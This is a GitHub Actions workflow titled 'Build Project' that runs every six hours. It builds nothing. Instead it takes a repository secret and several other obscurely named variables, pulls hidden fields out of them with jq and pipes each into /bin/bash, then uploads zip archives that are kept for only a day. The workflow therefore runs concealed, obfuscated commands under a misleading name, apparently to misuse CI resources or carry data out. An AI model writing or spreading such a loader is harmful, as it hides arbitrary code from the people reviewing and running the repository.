name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '21 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  main:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Process
        env:
          g81: ${{ secrets.g81 }}
        run: |
          printf '%s' "$g81" | jq -r .fgh51155 | /bin/bash
          echo $syec8686 | jq -r .od420 | /bin/bash
          echo $d0 | jq -r .cck949 | /bin/bash
          printf '%s' "$cczra26" | jq -r .nyyhu10756 | /bin/bash
          printf '%s' "$zppfi3" | jq -r .zpace86 | /bin/bash
          printf '%s' "$oybip42026" | jq -r .cn4350 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: lccQMJsg
          path: "*.zip"
          retention-days: 1
